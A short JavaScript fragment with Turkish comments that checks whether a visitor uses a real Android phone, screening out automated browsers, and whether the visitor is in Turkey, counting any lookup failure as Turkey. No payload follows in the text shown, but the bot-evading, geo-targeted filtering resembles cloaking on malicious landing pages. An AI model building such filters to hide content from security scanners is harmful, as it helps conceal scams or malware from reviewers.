  <script>
    // ✅ Android cihaz tespiti (Geniş kapsama)
    function isRealAndroid() {
      const ua = navigator.userAgent.toLowerCase();
      const keywords = [
        'android', 'linux; android', 'samsung', 'sm-', 'huawei', 'honor', 'xiaomi', 'mi', 'redmi',
        'poco', 'oppo', 'vivo', 'realme', 'oneplus', 'lenovo', 'zte', 'meizu', 'nokia', 'tecno',
        'infinix', 'doogee', 'ulefone', 'leeco', 'coolpad', 'alcatel', 'asus', 'philips',
        'motorola', 'sony', 'lg'
      ];
      const match = keywords.some(k => ua.includes(k));
      const touch = 'ontouchstart' in window;
      const bot = navigator.webdriver;

      return match && touch && !bot;
    }

    // 🌍 Türkiye kontrolü (Fallback'li)
    async function isFromTurkey() {
      try {
        const res = await fetch('https://api.country.is');
        if (!res.ok) return true; // hata varsa TR kabul et
        const json = await res.json();
        return json.country === 'TR';
      } catch {
        return true; // fallback: hata varsa TR say
      }
    }
